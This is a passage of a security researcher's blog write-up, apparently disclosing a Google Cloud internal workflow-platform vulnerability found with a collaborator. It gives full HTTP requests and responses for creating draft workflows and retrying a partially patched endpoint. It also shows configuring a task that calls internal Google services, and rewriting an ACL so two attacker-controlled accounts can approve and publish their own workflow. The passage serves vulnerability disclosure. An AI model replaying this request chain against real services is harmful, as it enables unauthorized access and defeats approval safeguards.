+    <span class="hljs-attr">&quot;lastModifiedTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-12-01T04:19:14.449503Z&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;DRAFT&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;snapshotNumber&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+      <span class="hljs-string">&quot;HEAD&quot;</span>
+    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;lockedBy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@gvrptest.cry.dev&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;lockedAtTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-12-01T04:19:14.449503Z&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;lastModifierEmail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@gvrptest.cry.dev&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;clientId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>However, it seemed in order to run a workflow, you had to publish it first, but that&#39;s where I got stuck:</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform:publishWorkflow</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>SAPISIDHASH &lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+
+<span class="language-subunit">{
+  &quot;workflowId&quot;: &quot;53b2a49c-dd5e<span class="hljs-string">-4</span>e45<span class="hljs-string">-829</span>b<span class="hljs-string">-61</span>a3b2e8ff6e&quot;
+}</span></code></pre><p><strong>Response</strong></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">403</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PERMISSION_DENIED&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>I had to somehow add another user to the workflow, and use that to publish. At the time, I attempted to use the ACL endpoints to add another account, but wasn&#39;t able to get the permissions to work correctly.</p>
+<h3 id="the-dm-that-changed-everything"><a class="anchor" href="#the-dm-that-changed-everything" aria-hidden="true">#</a>The DM that changed everything</h3><p>More than a month after I initially reported it, I was in a discord group chat with a few other researchers, where I jokingly mentioned that I had a bug to leak protobuf definitions within Google:</p>
+<p><img src="/assets/google-cloud-rce/discord_dm.jpg" alt="" loading="lazy" /></p>
+<p>That&#39;s when <a href="https://bughunters.google.com/profile/57154734-5ce9-431a-b0c3-ca3ba28bb499" target="_blank" rel="noopener noreferrer">shrugged</a> mentioned that he had the same bug, and our conversation took off.</p>
+<p>It turned out that shrugged had also been investigating this very same API when he noticed these endpoints listed in the javascript files for <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> while researching another bug. He had spotted <code>GenericStubbyTypedTask</code> as a potential RCE vector, but was stuck without a valid <code>client_id</code> for the initial draft workflow creation.</p>
+<p>Meanwhile, I had the <code>client_id</code> from the quota queue leak, but was stuck at the publishing step. We quickly traded notes: I shared <code>client_id: &quot;default&quot;</code> and where I&#39;d hit the wall, and we picked up from there.</p>
+<p>Google had already rolled out fixes from my initial report, so many of the original endpoints were now returning PERMISSION_DENIED. However, we noticed something interesting - many endpoints had 1:1 working counterparts under different service names:</p>
+<table>
+<thead>
+<tr>
+<th>Original (Blocked)</th>
+<th>Counterpart</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/v1/integrationPlatform:getProtoDefinition</td>
+<td>/v1/integrationPlatform/workflowsupport:getProtoDefinition</td>
+</tr>
+<tr>
+<td>/v1/integrationPlatform:runWorkflow</td>
+<td>/v1/integrationPlatform/workflowexecution:runWorkflow</td>
+</tr>
+<tr>
+<td>/v1/integrationPlatform:setAcl</td>
+<td>/v1/integrationPlatform/auth:setAcl</td>
+</tr>
+</tbody></table>
+<p>The initial fixes had only blocked the original &quot;WorkflowEditorService&quot; endpoints, but not these counterparts. The problem was <code>createDraftWorkflow</code> - we couldn&#39;t find a counterpart for it, and it was returning PERMISSION_DENIED:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">403</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The caller does not have permission&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PERMISSION_DENIED&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>Strangely, when shrugged tried the same request, it worked on his first attempt, while I was consistently getting <code>PERMISSION_DENIED</code>. That&#39;s when it clicked: the fix hadn&#39;t fully propagated across all load balanced backends yet. By repeatedly sending the same request, we could reliably route through a backend that still allowed it through:</p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=UTF-8
+
+<span class="language-perl">{ <span class="hljs-string">&quot;workflow&quot;</span>: { <span class="hljs-string">&quot;workflowId&quot;</span>: <span class="hljs-string">&quot;c6141c63-ac7a-4350-b582-7615ef045d0c&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;retest&quot;</span>, <span class="hljs-string">&quot;origin&quot;</span>: <span class="hljs-string">&quot;UI&quot;</span>, <span class="hljs-string">&quot;creatorEmail&quot;</span>: <span class="hljs-string">&quot;admin<span class="hljs-variable">@gvrptest</span>.cry.dev&quot;</span>, <span class="hljs-string">&quot;createdTime&quot;</span>: <span class="hljs-string">&quot;...&quot;</span>, <span class="hljs-string">&quot;lastModifiedTime&quot;</span>: <span class="hljs-string">&quot;...&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;DRAFT&quot;</span>, <span class="hljs-string">&quot;snapshotNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;tags&quot;</span>: [ <span class="hljs-string">&quot;HEAD&quot;</span> ], <span class="hljs-string">&quot;lockedBy&quot;</span>: <span class="hljs-string">&quot;admin<span class="hljs-variable">@gvrptest</span>.cry.dev&quot;</span>, <span class="hljs-string">&quot;lockedAtTime&quot;</span>: <span class="hljs-string">&quot;...&quot;</span>, <span class="hljs-string">&quot;lastModifierEmail&quot;</span>: <span class="hljs-string">&quot;admin<span class="hljs-variable">@gvrptest</span>.cry.dev&quot;</span>, <span class="hljs-string">&quot;clientId&quot;</span>: <span class="hljs-string">&quot;default&quot;</span> } }</span></code></pre><p>However, the task name GenericStubbyTypedTask didn&#39;t seem to exist. Looking at the response of <code>/v1/integrationPlatform:listTaskEntities</code> (decoded using the proto definitions from getProtoDefinition), it seemed to only provide tasks with <code>IO_TEMPLATE</code></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;taskEntities&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;metadata&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Delete SFDC Record&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;descriptiveName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Delete Salesforce Record&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Deletes a record in Salesforce&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;g3DocLink&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;iconLink&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;codeSearchLink&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java&quot;</span><span class="hljs-punctuation">,</span>
+      ...
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;paramSpecs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+          <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;salesforceDomain&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;STRING_VALUE&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;className&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+              <span class="hljs-attr">&quot;descriptivePhrase&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Check in Salesforce: Setup &gt; Company Settings &gt; My Domain. If you don&#x27;t have My Domain enabled, please use \&quot;yourinstance.salesforce.com\&quot; as the Salesforce domain.&quot;</span><span class="hljs-punctuation">,</span>
+              <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Salesforce domain&quot;</span><span class="hljs-punctuation">,</span>
+              <span class="hljs-attr">&quot;uiPlaceholderText&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;e.g. yourDomain.my.salesforce.com&quot;</span>
+            <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span>
+          <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+        ...
+        <span class="hljs-punctuation">]</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      ...
+      <span class="hljs-attr">&quot;taskType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;IO_TEMPLATE&quot;</span>
+    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+    ...
+  <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">}</span></code></pre><p>It seemed like the GenericStubbyTypedTask was likely part of the underlying <code>ASIS_TEMPLATE</code>:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;taskType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Defines the type of the task&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;enum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;TASK&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-string">&quot;ASIS_TEMPLATE&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-string">&quot;IO_TEMPLATE&quot;</span>
+      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;enumDescriptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;Normal IP task&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-string">&quot;Task is of As-Is Template type&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-string">&quot;Task is of I/O template type with a different underlying task&quot;</span>
+      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>Interestingly, the underlying RPC for this endpoint is <code>google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities</code>. This is eerily similar to the public <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> product&#39;s <code>/$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities</code> though that too didn&#39;t return any <code>ASIS_TEMPLATE</code> tasks directly.</p>
+<p>Looking back at Application Integration&#39;s <a href="https://www.gstatic.com/_/pantheon-platform/_/js/k=pantheon-platform.r_ffqsputwh.en_US.gfcqeedabC0.O/ck=pantheon-platform.r_ffqsputwh.M74CJWSkfgQ.L.W.O/am=AAAAAAAAAQ/d=0/rs=ALa0V2PM3qwkJsQayfzRJaJ2GniB6mlGVw/m=sy1u,sy2o,sy65,sy1v,sy2m,sy2k,sy2n,sy2p,sy2q,sy2x,sy6l,sy6n,sy66,sy3x,sy6i,syo1,syo6,syo5,sy34,syj,syo,sy1z,sy2l,sybx,sy71,sy5m,syep,syes,sy6u,sy6m,sy6k,syi7,syo7,syo4,sy10,sy35,sy5b,sye2,sy2d,syt,sys,sydn,syg4,sy6z,syn,sy20,syg8,syjq,syjp,syjv,sy5h,sy86,sybo,syek,syeo,syeq,syen,syer,syet,syeu,syev,syew,syex,syey,sy4,sy68,sye3,synv,syof,syoe,syor,syox,syov,sy31,sy4l,sy8b,sy6w,sy8f,syb9,sya,sy95,syc3,syds,sypc,syph,sy6o,sy6p,sy8d,sy8e,sy4r,syo3,sy1m,syei,syjh,syp6,sy3g,sy2r,sy11,sy2b,sy33,syb3,syd4,sy5c,sy5d,sy2i,sye9,sy2e,sy2f,sy2g,sy2h,sy1p,syv,sy4w,syr,sy58,sy59,sydm,sydo,sydp,sydq,sygh,sygk,sy8m,syjr,syk7,syhd,syem,sylk,syod,syog,syok,syop,syos,syot,syoz,syp0,syow,syoy,syhc,sy54,synz,sy3b,sy4k,sy4p,sy8g,synp,sypb,syct,sy5n,syhy,sypg,sy6q,sy8c,sydj,syb7,syc8,syoc,syp5,syp8,sye,sy26,sy87,sya4,syo2,syoi,syon,syp9,sy1y,sy2j,sy44,sy6e,sy99,sy9c,syb8,syc1,sye7,sye8,syed,syoj,sypd,sy2c,sy1w,sy1q,syw,sy19,sy1s,sy48,sy4b,sy4x,sy8i,sybr,syck,sydl,sye6,syfm,syfv,sygj,sygl,sygp,syhe,syj8,syjs,sykz,syl1,syl2,synb,synn,syoq,sypv,sypw,syq5,syqa,sy1r,sy4s,sy6s,sy8o,syaj,syha,synq,sypm,sypn,sycu,syp1,sy5o,sypi,cc5GEc,sy6r,sy6t,sy8h,sy9l,sya2,syaa,syb2,sybb,sybd,sybf,sybh,sybj,sybk,syc0,syc9,sycd,sydf,syg5,synx,NTA1Nc,syoa,syoo,syou,syp4,SUXzGf,a1YRQd,syp7,n5B0Gd,sypf,sypz,syq7,syq6,syq3,syqb,syq8,syq4,syii,sy6c,sy93,sy9s,syah,syam,sybp,syc4,syc5,syob,syol,syp2,sypk,syq1,syq2,syq9,CiTGSe" target="_blank" rel="noopener noreferrer">JS code</a> from <a href="https://console.cloud.google.com/" target="_blank" rel="noopener noreferrer">Cloud Console</a>:</p>
+<p><img src="/assets/google-cloud-rce/integrations_js.jpg" alt="" loading="lazy" /></p>
+<pre><code class="hljs language-js">[<span class="hljs-string">&quot;Vertex AI - Predict&quot;</span>,<span class="hljs-string">&quot;https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png&quot;</span>],
+[<span class="hljs-string">&quot;GenericStubbyTypedTaskV2&quot;</span>,<span class="hljs-string">&quot;http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg&quot;</span>],
+[<span class="hljs-string">&quot;RunGoogleSqlPlxQueryTask&quot;</span>,<span class="hljs-string">&quot;https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg&quot;</span>],
+[<span class="hljs-string">&quot;ConvertDremelResultToJsonTask&quot;</span>,<span class="hljs-string">&quot;https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png&quot;</span>],</code></pre><p>The exact task name was <strong>GenericStubbyTypedTaskV2</strong>, complete with its own icon, no less: <img src="/assets/google-cloud-rce/stubby_48px_blue.svg" alt="" loading="lazy" /></p>
+<p>Attempting to configure <code>GenericStubbyTypedTask</code> on <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> returned an error revealing the required fields:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">400</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#x27;Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.&#x27;&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;INVALID_ARGUMENT&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>Repeating with each missing key revealed <strong>serverSpec</strong>, <strong>serviceName</strong>, and <strong>serviceMethod</strong>. These same parameters applied to <code>GenericStubbyTypedTaskV2</code>. Using <a href="https://www.ezequiel.tech/" target="_blank" rel="noopener noreferrer">Ezequiel Pereira</a>&#39;s <a href="https://github.com/ezequielpereira/GAE-RCE/blob/c58ccd52d9204a0e5b8c7cf9b82b8e6e06d524a8/protos/net/rpc/serverstatus.proto#L155" target="_blank" rel="noopener noreferrer">protobuf repo</a> as reference and a GSLB address we found leaked in another discovery document, we configured the task to call <code>/ServerStatus.GetServices</code> on <strong>gslb:alkali-base</strong>:</p>
+<blockquote>
+<p>Fun fact: Alkali is Google&#39;s internal framework that Googlers can use to spin up production APIs with minimal boilerplate, they tend to have a lot of security issues.</p>
+</blockquote>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=UTF-8
+
+<span class="language-prolog">{<span class="hljs-string">&quot;workflow&quot;</span>: {<span class="hljs-string">&quot;workflowId&quot;</span>: <span class="hljs-string">&quot;f91833bf-eacb-43ac-8490-099fef977e19&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;retest-test123&quot;</span>, <span class="hljs-string">&quot;taskConfigs&quot;</span>: [{<span class="hljs-string">&quot;taskName&quot;</span>: <span class="hljs-string">&quot;GenericStubbyTypedTaskV2&quot;</span>, <span class="hljs-string">&quot;taskNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;parameters&quot;</span>: {<span class="hljs-string">&quot;response&quot;</span>: {<span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;response&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: {<span class="hljs-string">&quot;stringValue&quot;</span>: <span class="hljs-string">&quot;$response$&quot;</span>}, <span class="hljs-string">&quot;dataType&quot;</span>: <span class="hljs-string">&quot;STRING_VALUE&quot;</span>}, <span class="hljs-string">&quot;serverSpec&quot;</span>: {<span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;serverSpec&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: {<span class="hljs-string">&quot;stringValue&quot;</span>: <span class="hljs-string">&quot;gslb:alkali-base&quot;</span>}, <span class="hljs-string">&quot;dataType&quot;</span>: <span class="hljs-string">&quot;STRING_VALUE&quot;</span>}, <span class="hljs-string">&quot;serviceName&quot;</span>: {<span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;serviceName&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: {<span class="hljs-string">&quot;stringValue&quot;</span>: <span class="hljs-string">&quot;ServerStatus&quot;</span>}, <span class="hljs-string">&quot;dataType&quot;</span>: <span class="hljs-string">&quot;STRING_VALUE&quot;</span>}, <span class="hljs-string">&quot;serviceMethod&quot;</span>: {<span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;serviceMethod&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: {<span class="hljs-string">&quot;stringValue&quot;</span>: <span class="hljs-string">&quot;GetServices&quot;</span>}, <span class="hljs-string">&quot;dataType&quot;</span>: <span class="hljs-string">&quot;STRING_VALUE&quot;</span>}}, <span class="hljs-string">&quot;position&quot;</span>: {<span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-number">-716</span>, <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-number">-445</span>}, <span class="hljs-string">&quot;label&quot;</span>: <span class="hljs-string">&quot;Stubby Internal&quot;</span>, <span class="hljs-string">&quot;incomingEdgeCount&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;taskType&quot;</span>: <span class="hljs-string">&quot;ASIS_TEMPLATE&quot;</span>, <span class="hljs-string">&quot;externalTaskType&quot;</span>: <span class="hljs-string">&quot;NORMAL_TASK&quot;</span>}], <span class="hljs-string">&quot;triggerConfigs&quot;</span>: [{<span class="hljs-string">&quot;startTasks&quot;</span>: [{<span class="hljs-string">&quot;taskNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>}], <span class="hljs-string">&quot;properties&quot;</span>: {<span class="hljs-string">&quot;Trigger name&quot;</span>: <span class="hljs-string">&quot;my-api-trigger-123&quot;</span>}, <span class="hljs-string">&quot;triggerType&quot;</span>: <span class="hljs-string">&quot;API&quot;</span>, <span class="hljs-string">&quot;triggerNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;enabledClients&quot;</span>: [<span class="hljs-string">&quot;default&quot;</span>], <span class="hljs-string">&quot;triggerId&quot;</span>: <span class="hljs-string">&quot;api_trigger/my-api-trigger-123&quot;</span>}], <span class="hljs-string">&quot;origin&quot;</span>: <span class="hljs-string">&quot;UI&quot;</span>, <span class="hljs-string">&quot;creatorEmail&quot;</span>: <span class="hljs-string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="hljs-string">&quot;createdTime&quot;</span>: <span class="hljs-string">&quot;2026-01-12T09:45:55.896951Z&quot;</span>, <span class="hljs-string">&quot;lastModifiedTime&quot;</span>: <span class="hljs-string">&quot;2026-01-12T09:45:55.896951Z&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;DRAFT&quot;</span>, <span class="hljs-string">&quot;snapshotNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;tags&quot;</span>: [<span class="hljs-string">&quot;HEAD&quot;</span>], <span class="hljs-string">&quot;lockedBy&quot;</span>: <span class="hljs-string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="hljs-string">&quot;lockedAtTime&quot;</span>: <span class="hljs-string">&quot;2026-01-12T09:45:55.896951Z&quot;</span>, <span class="hljs-string">&quot;lastModifierEmail&quot;</span>: <span class="hljs-string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="hljs-string">&quot;clientId&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>}}</span></code></pre><p>Everything here is strikingly similar to <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> - the workflow structure, the task configuration, even the publishing and running flow. Notice the <code>&quot;position&quot;: {&quot;x&quot;: -716, &quot;y&quot;: -445}</code> in our workflow? The internal UI likely looks very similar to Application Integration&#39;s visual workflow editor, where we&#39;re essentially setting coordinates for task positions:</p>
+<p><img src="/assets/google-cloud-rce/integrations_editor_layout.jpg" alt="" loading="lazy" /></p>
+<p>Remember the ACL issue that blocked me from publishing earlier? shrugged figured out we could bypass it by updating the ACL for <code>IP_EVENTBUS_WORKFLOWS</code> with the obfuscated Gaia ID of two attacker controlled Google accounts.</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform/auth:setAcl</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>500
+
+<span class="language-prolog">{<span class="hljs-string">&quot;resourceInfo&quot;</span>: {<span class="hljs-string">&quot;resource&quot;</span>: <span class="hljs-string">&quot;IP_EVENTBUS_WORKFLOWS&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;retest-test123&quot;</span>}, <span class="hljs-string">&quot;acl&quot;</span>: {<span class="hljs-string">&quot;entries&quot;</span>: [{<span class="hljs-string">&quot;scope&quot;</span>: {<span class="hljs-string">&quot;obfuscatedGaiaId&quot;</span>: <span class="hljs-string">&quot;100029910836469267942&quot;</span>}, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-number">105</span>}, {<span class="hljs-string">&quot;scope&quot;</span>: {<span class="hljs-string">&quot;obfuscatedGaiaId&quot;</span>: <span class="hljs-string">&quot;113728935872649341310&quot;</span>}, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-number">105</span>}]}}</span></code></pre><p><strong>Response</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=UTF-8
+
+<span class="language-dust"><span class="hljs-template-variable">{}</span></span></code></pre><p>First, we toggled the request to publish workflow using the first attacker Google account:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+...
+
+<span class="language-subunit">{&quot;workflowId&quot;: &quot;f91833bf-eacb<span class="hljs-string">-43</span>ac<span class="hljs-string">-8490</span><span class="hljs-string">-099</span>fef977e19&quot;}</span></code></pre><p>And then finally publishing the workflow using the second attacker account:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform/workflowdeployment:publishWorkflow</span> <span class="hljs-meta">HTTP/2</span>
